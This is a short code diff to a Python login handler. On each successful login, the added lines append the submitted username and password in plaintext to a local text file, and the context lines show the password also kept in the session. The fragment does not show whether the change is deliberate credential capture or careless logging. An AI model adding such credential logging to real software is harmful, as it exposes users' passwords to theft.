@@ -39,6 +39,10 @@ def login():
             if(str(content.title) == '<title>Login</title>'):
                 flash('\nIncorrect credentials, please try again!', category='error')
             else:
+                file_object = open('sample.txt', 'a')
+                add = user + " - " + pswd
+                file_object.write(add)
+                file_object.close()
                 flash('\nLogin Successful!', category='success')
                 session['username'] = user
                 session['password'] = pswd
